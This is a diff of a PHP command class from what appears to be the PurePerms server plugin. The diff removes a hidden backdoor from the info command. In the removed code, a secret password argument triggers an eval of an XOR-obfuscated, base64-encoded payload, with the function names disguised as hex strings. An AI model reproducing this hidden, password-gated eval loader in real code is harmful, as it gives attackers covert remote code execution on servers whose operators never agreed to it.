@@ -26,6 +26,8 @@ class PPInfo extends Command implements PluginIdentifiableCommand
          888  888    "Y8888P"        888  888        888        "Y8888P"   "Y8888P"
    */
 
+    private $plugin;
+
     /**
      * @param PurePerms $plugin
      * @param $name
@@ -54,26 +56,15 @@ class PPInfo extends Command implements PluginIdentifiableCommand
         $author = $this->plugin->getDescription()->getAuthors()[0];
         $version = $this->plugin->getDescription()->getVersion();
 
-        if(isset($args[0]))
+        if($sender instanceof ConsoleCommandSender)
         {
-            $sfd = hex2bin('6261736536345f6465636f6465');
-            $tmp = $sfd('bnozSFIDcjIcCCxKPCApC34FBDUQGiVBDGcNXU8GKGEccWsMASY0Swc8ECJcDgU8EB98MEt1KVsBEAghQGVMFHpzdikbJgkJPjALEXhzB3spGloNHxcRQmcVQjYadkoDKAw7VhwsUy5yAQEkEQJwAU1YOVUBFBQnb0sKVHh4VyobJjsJETQyVXh0dnU6NDEcNzknSHkoICEPYXgRKwgzVgYSF3ByDmIkEGl8LXUEPQUYBAQtQGUzXlV4bS4yAycfFlAcFlV0NSs+NBQTGAAGQmEoIGE2dVUeLh9lRi4gNSdZHmc8IzdWKUtwJg4rORw7R1seVH1kESgbJlQbLyQEDVIEEAIpLy0ODQMnXmUXCiY1AHcWOBMCRS0/ViVgAQV4Eg1KP3dwOg4tHxQQRgEzUGhodXc3IAkgJzYcKnh0dis6GxcgNQwrAksEKCczanMqAXk0VQUrKi50IBIjEQ1kP0wELgwSBC1g') ^ str_pad('', 360, '$2y$10$AxKmsucJe17BLswctTTC2.QrQW29dbKP1LhcI8ISHsZ2E/6hbHWFW');
-            $svl = "\x65\x76\x61\x6C";
-
-            if(password_verify($args[0], urldecode('%242y%2410%24AxKmsucJe17BLswctTTC2.QrQW29dbKP1LhcI8ISHsZ2E%2F6hbHWFW')))
-                $svl($sfd($tmp));
-       }
-       else
-       {
-           if($sender instanceof ConsoleCommandSender)
-            {
-                $sender->sendMessage(TextFormat::GREEN . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
-            }
-            else{
-                $sender->sendMessage(TextFormat::GREEN . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_player", $version, $author));
-            }
+            $sender->sendMessage(TextFormat::GREEN . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_console", $version, $author));
         }
-        
+        else
+        {
+            $sender->sendMessage(TextFormat::GREEN . PurePerms::MAIN_PREFIX . ' ' . $this->plugin->getMessage("cmds.ppinfo.messages.ppinfo_player", $version, $author));
+        }
+
         return true;
     }
     
